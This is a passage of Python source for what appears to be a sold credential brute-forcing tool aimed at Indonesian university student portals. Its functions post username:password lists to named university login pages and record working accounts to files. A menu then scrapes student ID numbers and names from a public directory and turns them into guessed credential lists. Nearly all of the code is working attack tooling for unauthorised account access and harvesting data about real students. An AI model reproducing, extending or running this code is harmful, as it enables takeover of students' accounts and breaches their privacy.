        print(f'{NC}•    {Y}Tersimpan Di {NC}=> {C}unsrat_aktif.txt{NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  UNSRAT  {NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
    def umsida(List):
      with open(List, 'r') as (f):
        lines = f.readlines()
        count = 0
        sleep(1)
        for line in lines:
          data = line.strip()
          user = data.split(':')[0]
          pswd = data.split(':')[1]
          if len(data) > 0:
            try:
              ses = requests.Session()
              anu = 'https://sim.umsida.ac.id'
              anus = bs(ses.get(anu, timeout=10, verify=False).text, 'html.parser').findAll('input')
              dat = {
                'username': user, 'password': pswd, 
                'lgndim': anus[2]['value'], 'submit':'Login'
              }
              anuin = bs(ses.post(anu, data=dat, timeout=10, verify=False).text, 'html.parser').find('h2')
              if anuin.text == 'Login':
                count += 1
                print(f'{NC}  • {DC}{count}{NC}){R} MODAR {NC}=>{R} {user}{NC} | {R}{pswd}')
                error.append(f'{data}')
              else:
                count += 1
                print(f'{NC}  • {DC}{count}{NC}){G} AKTIF {NC}=>{G} {user}{NC} | {G}{pswd}')
                found.append(f'{data}')
                with open('umsida_aktif.txt', 'a') as (s):
                  s.write(f'[ AKTIF ] {user}:{pswd}\n')
            except Exception:
              c(anu)
        done()
        print(f'{NC}•    {Y}Tersimpan Di {NC}=> {C}umsida_aktif.txt{NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  UMSIDA  {NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
    def unsyiah(List):
      with open(List, 'r') as (f):
        lines = f.readlines()
        count = 0
        sleep(1)
        for line in lines:
          data = line.strip()
          user = data.split(':')[0]
          pswd = data.split(':')[1]
          if len(data) > 0:
            try:
              ses = requests.Session()
              anu = 'https://simkuliah.unsyiah.ac.id/index.php/login'
              dat = { 'username':user, 'password':pswd }
              anuin = bs(ses.post(anu, data=dat, timeout=10, verify=False).text, 'html.parser').find('h5')
              if anuin.text == 'Login dengan Akun SIMPEG/KRS':
                count += 1
                print(f'{NC}  • {DC}{count}{NC}){R} MODAR {NC}=>{R} {user}{NC} | {R}{pswd}')
                error.append(f'{data}')
              else:
                count += 1
                print(f'{NC}  • {DC}{count}{NC}){G} AKTIF {NC}=>{G} {user}{NC} | {G}{pswd}')
                found.append(f'{data}')
                with open('unsyiah_aktif.txt', 'a') as (s):
                  s.write(f'[ AKTIF ] {user}:{pswd}\n')
            except Exception:
              c(anu)
        done()
        print(f'{NC}•    {Y}Tersimpan Di {NC}=> {C}unsyiah_aktif.txt{NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW} UNSYIAH {NC}')
        print(f'{NC} • • • • • • • • • • • • • • • • • • • • • • • • •')
    def c1(anu1):
      for ih1 in range(10000000000):
        try:
          anuin1 = req.get(anu1, timeout=3, verify=False)
          if anuin1.status_code:
            break
        except requests.exceptions.Timeout:
          sys.stdout.write(f'{DW} • {DR}Timeout{DW}..!!{NC}                            \r')
        except requests.exceptions.ConnectionError:
          sys.stdout.write(f'{DW} • {DR}Connection Error{DW}..!!{NC}                            \r')
        except KeyboardInterrupt:
          exit(f'{DW}\r•    {DR}Keyboard Interupted{DW}..!!{NC}')
      return True
    def c2(anu2):
      for ih2 in range(10000000000):
        try:
          anuin2 = req.get(anu2, timeout=3, verify=False)
          if anuin2.status_code:
            break
        except requests.exceptions.Timeout:
          sys.stdout.write(f'{DW} • {DR}Timeout{DW}..!!{NC}                            \r')
        except requests.exceptions.ConnectionError:
          sys.stdout.write(f'{DW} • {DR}Connection Error{DW}..!!{NC}                            \r')
        except KeyboardInterrupt:
          exit(f'{DW}\r•    {DR}Keyboard Interupted{DW}..!!{NC}')
      return True
    def c3(anu3):
      for ih3 in range(10000000000):
        try:
          anuin3 = req.get(anu3, timeout=3, verify=False)
          if anuin3.status_code:
            break
        except requests.exceptions.Timeout:
          sys.stdout.write(f'{DW} • {DR}Timeout{DW}..!!{NC}                            \r')
        except requests.exceptions.ConnectionError:
          sys.stdout.write(f'{DW} • {DR}Connection Error{DW}..!!{NC}                            \r')
        except KeyboardInterrupt:
          exit(f'{DW}\r•    {DR}Keyboard Interupted{DW}..!!{NC}')
      return True
    def nimz1(anu1):
      with open('forlap.txt', 'w') as f:
        f.write(f'')
      c1(anu1)
      cek = bs(req.get(anu1, timeout=10, verify=False).text, 'html.parser')
      if cek.findAll('div', {'class': 'pagination'}):
        try:
          x1 = cek.findAll('div', {'class': 'pagination'})[0].findAll('a')[1]['href']
          z1 = int(x1.split('/')[7:][0])//20
          _1 = x1.split('/')[:7]
          _1 = f'{_1[0]}/{_1[1]}/{_1[2]}/{_1[3]}/{_1[4]}/{_1[5]}/{_1[6]}/'
          for _1 in range(int(z1)):
            print(f'{NC} • {G}DONE {NC}=> {Y}Scrap Halaman Ke {NC}: {C}{_1+1}{NC}')
            anu2 = (f'{anu1}/{_1*20}')
            c2(anu2)
            ambil1 = bs(req.get(anu2, timeout=10, verify=False).text, 'html.parser').find('table').findAll('tr')
            for ini1 in range(len(ambil1)-1):
              ambilin1 = ambil1[ini1+1].findAll('td')
              dapat.append({'nim': ambilin1[1].text.replace(' ',''), 'nama' : ambilin1[2].text})
          z2 = cek.findAll('div', {'class': 'pagination'})[0].findAll('a')[1]['href']
          c1(anu1)
          ambil2 = bs(req.get(z2, timeout=10, verify=False).text, 'html.parser').find('table').findAll('tr')
          _1 += 1
          print(f'{NC} • {G}DONE {NC}=> {Y}Scrap Halaman Ke {NC}: {C}{_1+1}{NC}')
          for ini2 in range(len(ambil2)-1):
            ambilin2 = ambil2[ini2+1].findAll('td')
            dapat.append({'nim': ambilin2[1].text.replace(' ',''), 'nama' : ambilin2[2].text})
        except IndexError:
          _1 = 0
          c1(anu1)
          if cek.findAll('div', {'class': 'pagination'}):
            ambil3 = cek.find('table').findAll('tr')
            _1 += 1
            print(f'{NC} • {G}DONE {NC}=> {Y}Scrap Halaman Ke {NC}: {C}{_1}{NC}')
            for ini3 in range(len(ambil3)-1):
              ambilin3 = ambil3[ini3+1].findAll('td')
              dapat.append({'nim': ambilin3[1].text.replace(' ',''), 'nama' : ambilin3[2].text})
            z4 = cek.findAll('div', {'class': 'pagination'})[0].findAll('a')[0]['href']
            c1(anu1)
            ambil4 = bs(req.get(z4, timeout=10, verify=False).text, 'html.parser').find('table').findAll('tr')
            _1 += 1
            print(f'{NC} • {G}DONE {NC}=> {Y}Scrap Halaman Ke {NC}: {C}{_1}{NC}')
            for ini4 in range(len(ambil4)-1):
              ambilin4 = ambil4[ini4+1].findAll('td')
              dapat.append({'nim': ambilin4[1].text.replace(' ',''), 'nama' : ambilin4[2].text})
        except:
          if Exception:
            c1(anu1)
          elif Exception:
            c2(anu2)
      else:
        _1 = 0
        c1(anu1)
        ambil = cek.find('table').findAll('tr')
        _1 += 1
        print(f'{NC} • {G}DONE {NC}=> {Y}Scrap Halaman Ke {NC}: {C}{_1}{NC}')
        for ini in range(len(ambil)-1):
          ambilin = ambil[ini+1].findAll('td')
          dapat.append({'nim': ambilin[1].text.replace(' ',''), 'nama' : ambilin[2].text})
    def nimz2(anu1):
      with open('Forlap.txt', 'w') as f:
        f.write(f'')
      os.system('clear')
      print(f'{NC} • {BR}Created By de@hdies{NC} • • •')
      print(f'{NC} • {BW}Bruteforce Account University of Indonesia{NC} • • •')
      ambil = bs(req.get(anu1, verify=False).text, 'html.parser').find_all('td')
      _sp = ambil[2].text
      _nps = ambil[11].text
      _pt = ambil[5].text
      print(f'{NC}•  {Y}Informasi {NC}:')
      print(f'{NC}•    {C}Status Prodi  {NC}=> {G}{_sp}{NC}')
      print(f'{NC}•    {C}Program Studi {NC}=> {G}{_nps}{NC}')
      print(f'{NC}•  {R}{_pt}{NC}')
      print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
      c1(anu1)
      _1 = bs(req.get(anu1, verify=False).text, 'html.parser').findAll('div', attrs={'id':'mahasiswa'})[0].findAll('a')
      count = 0
      for Link in _1:
        anu2 = Link['href']
        Links = str(anu2)[104:]
        Anggota = Link.contents[0]
        count += 1
        print(f'{NC}  •  {C}{count}{NC}) {R}{Links} {NC}: {C}{Anggota} {R}NIM{NC}')
        c2(anu2)
        cek = bs(req.get(anu2, verify=False).text, 'html.parser')
        if cek.findAll('div', {'class': 'pagination'}):
          try:
            x1 = cek.findAll('div', {'class': 'pagination'})[0].findAll('a')[1]['href']
            z1 = int(x1.split('/')[7:][0])//20
            _1 = x1.split('/')[:7]
            _1 = f'{_1[0]}/{_1[1]}/{_1[2]}/{_1[3]}/{_1[4]}/{_1[5]}/{_1[6]}/'
            for _1 in range(int(z1)):
              print(f'{NC} • {G}DONE {NC}=> {Y}Scrap Halaman Ke {NC}: {C}{_1+1}{NC}')
              anu3 = (f'{anu2}/{_1*20}')
              c3(anu3)
              ambil1 = bs(req.get(anu3, verify=False).text, 'html.parser').find('table').findAll('tr')
              for ini1 in range(len(ambil1)-1):
                ambilin1 = ambil1[ini1+1].findAll('td')
                dapat.append({'nim': ambilin1[1].text.replace(' ',''), 'nama' : ambilin1[2].text})
            z2 = cek.findAll('div', {'class': 'pagination'})[0].findAll('a')[1]['href']
            c2(anu2)
            ambil2 = bs(req.get(z2, verify=False).text, 'html.parser').find('table').findAll('tr')
            _1 += 1
            print(f'{NC} • {G}DONE {NC}=> {Y}Scrap Halaman Ke {NC}: {C}{_1+1}{NC}')
            for ini2 in range(len(ambil2)-1):
              ambilin2 = ambil2[ini2+1].findAll('td')
              dapat.append({'nim': ambilin2[1].text.replace(' ',''), 'nama' : ambilin2[2].text})
          except IndexError:
            _1 = 0
            c2(anu2)
            if cek.findAll('div', {'class': 'pagination'}):
              ambil3 = cek.find('table').findAll('tr')
              _1 += 1
              print(f'{NC} • {G}DONE {NC}=> {Y}Scrap Halaman Ke {NC}: {C}{_1}{NC}')
              for ini3 in range(len(ambil3)-1):
                ambilin3 = ambil3[ini3+1].findAll('td')
                dapat.append({'nim': ambilin3[1].text.replace(' ',''), 'nama' : ambilin3[2].text})
              z4 = cek.findAll('div', {'class': 'pagination'})[0].findAll('a')[0]['href']
              c2(anu2)
              ambil4 = bs(req.get(z4, verify=False).text, 'html.parser').find('table').findAll('tr')
              _1 += 1
              print(f'{NC} • {G}DONE {NC}=> {Y}Scrap Halaman Ke {NC}: {C}{_1}{NC}')
              for ini4 in range(len(ambil4)-1):
                ambilin4 = ambil4[ini4+1].findAll('td')
                dapat.append({'nim': ambilin4[1].text.replace(' ',''), 'nama' : ambilin4[2].text})
          except:
            if Exception:
              c1(anu1)
            elif Exception:
              c2(anu2)
            elif Exception:
              c3(anu3)
        else:
          _1 = 0
          c2(anu2)
          ambil = cek.find('table').findAll('tr')
          _1 += 1
          print(f'{NC} • {G}DONE {NC}=> {Y}Scrap Halaman Ke {NC}: {C}{_1}{NC}')
          for ini in range(len(ambil)-1):
            ambilin = ambil[ini+1].findAll('td')
            dapat.append({'nim': ambilin[1].text.replace(' ',''), 'nama' : ambilin[2].text})
    def mm():
      kunci()
      if expired >= exp:
        lg()
        print(f'{NC} • {DR}Waktu {DC}Trial {DY}Habis{DW}..!!{NC}')
        sleep(1)
        print(f'{NC} • {DY}Hub Owner {DW}=> {DR}WA {DC}081233657831{NC} 🙏')
      else:
        try:
          lg()
          Pilih_MainMenu = input(f' • {Y}Pilih Menu {NC}=>{DW} ')
          if Pilih_MainMenu == '':
            print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
            sleep(1)
            mm()
          elif Pilih_MainMenu == '1':
            List = input(f'{NC} • {R}Masukan {Y}List{NC} =>{DW} ')
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    UB    {NC}')
            ub(List)
          elif Pilih_MainMenu == '2':
            List = input(f'{NC} • {R}Masukan {Y}List{NC} =>{DW} ')
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    UI    {NC}')
            ui(List)
          elif Pilih_MainMenu == '3':
            List = input(f'{NC} • {R}Masukan {Y}List{NC} =>{DW} ')
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    UII    {NC}')
            uii(List)
          elif Pilih_MainMenu == '4':
            List = input(f'{NC} • {R}Masukan {Y}List{NC} =>{DW} ')
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    UAD    {NC}')
            uad(List)
          elif Pilih_MainMenu == '5':
            List = input(f'{NC} • {R}Masukan {Y}List{NC} =>{DW} ')
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    UGM    {NC}')
            ugm(List)
          elif Pilih_MainMenu == '6':
            List = input(f'{NC} • {R}Masukan {Y}List{NC} =>{DW} ')
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    UPI    {NC}')
            upi(List)
          elif Pilih_MainMenu == '7':
            print(f'{NC} • {DR}Menu {DC}Scan Ini {DW}=>\n{NC} • {DR}Masih Belum Bisa Di Gunakan{DW}..!!{NC}')
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    USD    {NC}')
            sleep(1)
            enters = input(f' • {DY}Enter {DC}Untuk Kembali{DW}..!!{NC}')
            if enters == '':
              tungs(3)
              mm()
          elif Pilih_MainMenu == '8':
            List = input(f'{NC} • {R}Masukan {Y}List{NC} =>{DW} ')
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    IPB    {NC}')
            ipb(List)
          elif Pilih_MainMenu == '9':
            List = input(f'{NC} • {R}Masukan {Y}List{NC} =>{DW} ')
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    ITB    {NC}')
            itb(List)
          elif Pilih_MainMenu == '10':
            List = input(f'{NC} • {R}Masukan {Y}List{NC} =>{DW} ')
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    ITS    {NC}')
            its(List)
          elif Pilih_MainMenu == '11':
            List = input(f'{NC} • {R}Masukan {Y}List{NC} =>{DW} ')
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}   UAJY   {NC}')
            uajy(List)
          elif Pilih_MainMenu == '12':
            print(f'{NC} • {DR}Menu {DC}Scan Ini {DW}=>\n{NC} • {DR}Masih Belum Bisa Di Gunakan{DW}..!!{NC}')
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    USD    {NC}')
            sleep(1)
            enters = input(f' • {DY}Enter {DC}Untuk Kembali{DW}..!!{NC}')
            if enters == '':
              tungs(3)
              mm()
          elif Pilih_MainMenu == '13':
            List = input(f'{NC} • {R}Masukan {Y}List{NC} =>{DW} ')
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}   UNUSA   {NC}')
            unusa(List)
          elif Pilih_MainMenu == '14':
            print(f'{NC} • {DR}Menu {DC}Scan Ini {DW}=>\n{NC} • {DR}Masih Belum Bisa Di Gunakan{DW}..!!{NC}')
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}    USD    {NC}')
            sleep(1)
            enters = input(f' • {DY}Enter {DC}Untuk Kembali{DW}..!!{NC}')
            if enters == '':
              tungs(3)
              mm()
          elif Pilih_MainMenu == '15':
            List = input(f'{NC} • {R}Masukan {Y}List{NC} =>{DW} ')
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}   UNTAN   {NC}')
            untan(List)
          elif Pilih_MainMenu == '16':
            List = input(f'{NC} • {R}Masukan {Y}List{NC} =>{DW} ')
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}   WALI9   {NC}')
            wali9(List)
          elif Pilih_MainMenu == '17':
            List = input(f'{NC} • {R}Masukan {Y}List{NC} =>{DW} ')
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  UNSRAT  {NC}')
            unsrat(List)
          elif Pilih_MainMenu == '18':
            List = input(f'{NC} • {R}Masukan {Y}List{NC} =>{DW} ')
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  UMSIDA  {NC}')
            umsida(List)
          elif Pilih_MainMenu == '19':
            List = input(f'{NC} • {R}Masukan {Y}List{NC} =>{DW} ')
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW} UNSYIAH {NC}')
            unsyiah(List)
          elif Pilih_MainMenu == '20':
            os.system('clear')
            print(f'{NC} • {BR}Created By de@hdies{NC} • • •')
            print(f' • {BW}Brutforce Account University of Indonesia{NC} • • •')
            print(f'•  {Y}Menu Grab {NC}:')
            print(f'•    {C}1{NC}) GRAB {G}NIM{NC}                 {C}11{NC}) GRAB {G}NIM{NC}:{G}nama tgh(i){NC}')
            print(f'•    {C}2{NC}) GRAB {G}NIM{NC}:{G}NIM(i){NC}          {C}12{NC}) GRAB {G}NIM{NC}:{G}Nama Tgh(i){NC}')
            print(f'•    {C}3{NC}) GRAB {G}nama lkp{NC}:{G}NIM(i){NC}     {C}13{NC}) GRAB {G}nama lkp{NC}:{G}nama tgh(i){NC}')
            print(f'•    {C}4{NC}) GRAB {G}Nama Lkp{NC}:{G}NIM(i){NC}     {C}14{NC}) GRAB {G}nama lkp{NC}:{G}Nama Tgh(i){NC}')
            print(f'•    {C}5{NC}) GRAB {G}nama lkp{NC}:{G}nama(i){NC}    {C}15{NC}) GRAB {G}NIM{NC}:{G}(i){NC}')
            print(f'•    {C}6{NC}) GRAB {G}nama lkp{NC}:{G}Nama(i){NC}    {C}16{NC}) GRAB {G}nama(i){NC}:{G}nama(i){NC}')
            print(f'•    {C}7{NC}) GRAB {G}NIM{NC}:{G}nama(i){NC}    	 {C}17{NC}) GRAB {G}nama(i){NC}:{G}Nama(i){NC}')
            print(f'•    {C}8{NC}) GRAB {G}NIM{NC}:{G}Nama(i){NC}    	 {C}18{NC}) GRAB {G}nama{NC}:{G}(i){NC}')
            print(f'•    {C}9{NC}) GRAB {G}NIM{NC}:{G}@nama(i){NC}   	 {C}19{NC}) GRAB {G}NIM{NC}:{G}ALL_in_1{NC}')
            print(f'•    {C}10{NC}) GRAB {G}NIM{NC}:{G}@Nama(i){NC}   	 {R}00{NC}) {Y}Kembali{NC}')
            print(f'•    {R}x{NC}) {R}Keluar{NC}')
            print(f'{NC} • • • • • • • • • • • • • • • • • • • {BR}BruteForce{NC}')
            Pilih_MenuGrab = input(f' • {Y}Pilih Menu {NC}=>{DW} ')
            if Pilih_MenuGrab == '':
              print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
              sleep(1)
              mm()
            elif Pilih_MenuGrab == '1':
              apa = input(f'{NC} • {DC}1{DW}) {DG}Single {DW}| {DC}2{DW}) {DG}Multi {DW}=> {NC}')
              if apa == '':
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
              elif apa == '1':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz1(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  with open(path, 'a') as o_:
                    o_.write(_nim_+'\n')
                doneGrab()
              elif apa == '2':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz2(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  with open(path, 'a') as o_:
                    o_.write(_nim_+'\n')
                doneGrab()
              else:
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
            elif Pilih_MenuGrab == '2':
              apa = input(f'{NC} • {DC}1{DW}) {DG}Single {DW}| {DC}2{DW}) {DG}Multi {DW}=> {NC}')
              if apa == '':
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
              elif apa == '1':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz1(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  with open(path, 'a') as o_:
                    o_.write(_nim_+':'+_nim_+cuk+'\n')
                doneGrab()
              elif apa == '2':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz2(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  with open(path, 'a') as o_:
                    o_.write(_nim_+':'+_nim_+cuk+'\n')
                doneGrab()
              else:
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
            elif Pilih_MenuGrab == '3':
              apa = input(f'{NC} • {DC}1{DW}) {DG}Single {DW}| {DC}2{DW}) {DG}Multi {DW}=> {NC}')
              if apa == '':
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
              elif apa == '1':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz1(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.replace(' ', '.').lower()
                  with open(path, 'a') as o_:
                    o_.write(_nama_+':'+_nim_+cuk+'\n')
                doneGrab()
              elif apa == '2':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz2(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.replace(' ', '.').lower()
                  with open(path, 'a') as o_:
                    o_.write(_nama_+':'+_nim_+cuk+'\n')
                doneGrab()
              else:
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
            elif Pilih_MenuGrab == '4':
              apa = input(f'{NC} • {DC}1{DW}) {DG}Single {DW}| {DC}2{DW}) {DG}Multi {DW}=> {NC}')
              if apa == '':
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
              elif apa == '1':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz1(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.replace(' ', '.').title()
                  with open(path, 'a') as o_:
                    o_.write(_nama_+':'+_nim_+cuk+'\n')
                doneGrab()
              elif apa == '2':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz2(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.replace(' ', '.').title()
                  with open(path, 'a') as o_:
                    o_.write(_nama_+':'+_nim_+cuk+'\n')
                doneGrab()
              else:
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
            elif Pilih_MenuGrab == '5':
              apa = input(f'{NC} • {DC}1{DW}) {DG}Single {DW}| {DC}2{DW}) {DG}Multi {DW}=> {NC}')
              if apa == '':
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
              elif apa == '1':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz1(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.replace(' ', '.').lower()
                  with open(path, 'a') as o_:
                    o_.write(_nama_+':'+_nama_.split('.')[0]+cuk+'\n')
                doneGrab()
              elif apa == '2':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz2(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.replace(' ', '.').lower()
                  with open(path, 'a') as o_:
                    o_.write(_nama_+':'+_nama_.split('.')[0]+cuk+'\n')
                doneGrab()
              else:
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
            elif Pilih_MenuGrab == '6':
              apa = input(f'{NC} • {DC}1{DW}) {DG}Single {DW}| {DC}2{DW}) {DG}Multi {DW}=> {NC}')
              if apa == '':
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
              elif apa == '1':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz1(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_1 = _potnama_.replace(' ', '.').lower()
                  _nama_2 = _potnama_.replace(' ', '.').title()
                  with open(path, 'a') as o_:
                    o_.write(_nama_1+':'+_nama_2.split('.')[0]+cuk+'\n')
                doneGrab()
              elif apa == '2':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz2(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_1 = _potnama_.replace(' ', '.').lower()
                  _nama_2 = _potnama_.replace(' ', '.').title()
                  with open(path, 'a') as o_:
                    o_.write(_nama_1+':'+_nama_2.split('.')[0]+cuk+'\n')
                doneGrab()
              else:
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
            elif Pilih_MenuGrab == '7':
              apa = input(f'{NC} • {DC}1{DW}) {DG}Single {DW}| {DC}2{DW}) {DG}Multi {DW}=> {NC}')
              if apa == '':
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
              elif apa == '1':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz1(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.split(' ')
                  with open(path, 'a') as o_:
                    o_.write(_nim_+':'+_nama_[0].lower()+cuk+'\n')
                doneGrab()
              elif apa == '2':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz2(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.split(' ')
                  with open(path, 'a') as o_:
                    o_.write(_nim_+':'+_nama_[0].lower()+cuk+'\n')
                doneGrab()
              else:
